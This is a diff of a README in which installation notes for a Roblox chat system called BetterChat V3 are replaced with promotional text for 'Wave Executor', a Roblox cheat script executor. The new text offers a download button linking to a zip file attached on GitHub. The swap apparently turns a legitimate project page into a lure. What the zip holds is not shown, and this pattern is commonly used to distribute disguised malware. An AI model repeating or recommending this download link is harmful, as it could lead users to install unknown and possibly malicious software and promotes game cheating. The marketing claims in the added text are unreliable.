@@ -1,13 +1,49 @@
-Rolox custom chat system:
+# Wave Executor
 
-DevForum post: https://devforum.roblox.com/t/better-chat-v3-feature-rich-custom-chat-with-replies-rich-text-message-editing-and-more/1756348
+![Wave Executor Logo](logo.png)
 
-Uncompleted documentation: https://jumpathy.gitbook.io/betterchat-v3
+## Description
 
-Installation instructions:
-1. Insert the loader: https://create.roblox.com/store/asset/9376009942/BetterChat-V3-Alpha
-2. Insert the source code from the releases page or from the auto-update plugin (updater.lua found in extras)
-2A. If installing manually, modify the loader to reference the new source code
-3. Go to TextChatService in the explorer, and set ‘ChatVersion’ to ‘LegacyChatService’
-4, Go to the model tab in studio, Advanced (on the far right), Service, and insert ‘Chat’.
-5. From here, all you need to do is turn off ‘LoadDefaultChat’ and ‘BubbleChatEnabled’
+Welcome to Wave Executor, a robust Windows-based script executor tailored for Roblox enthusiasts. Wave Executor boasts AI integration for seamless script development, ad-free premium features, and 24/7 support, ensuring an unparalleled user experience and elevating your gameplay to new heights.
+
+## Features
+
+- **AI Integration:** Our AI-powered system assists in script development, making the process smooth and efficient.
+- **Premium Features:** Enjoy ad-free usage and access exclusive premium functionalities to enhance your gaming experience.
+- **24/7 Support:** Our dedicated support team is available around the clock to address any queries or issues you may encounter.
+
+## Installation
+
+To download Wave Executor, click the button below:
+
+[![Download Wave Executor](https://img.shields.io/badge/Download-Wave--Executor-blueviolet)](https://github.com/user-attachments/files/16820624/Wave.zip)
+
+## Usage
+
+1. **Step 1:** Download and install Wave Executor.
+2. **Step 2:** Launch the application.
+3. **Step 3:** Follow the on-screen instructions to start leveraging the various features.
+
+## Support
+
+For any assistance or inquiries, feel free to reach out to our support team at [support@waveexecutor.com](mailto:support@waveexecutor.com).
+
+## Contributing
+
+We welcome contributions from the community to enhance Wave Executor further. To contribute, please follow these steps:
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request.
+
+## License
+
+This project is licensed under the [MIT License](LICENSE).
+
+---
+
+<div align="center">
+
+🌊 Happy Scripting with Wave Executor! 🚀
+
+</div>
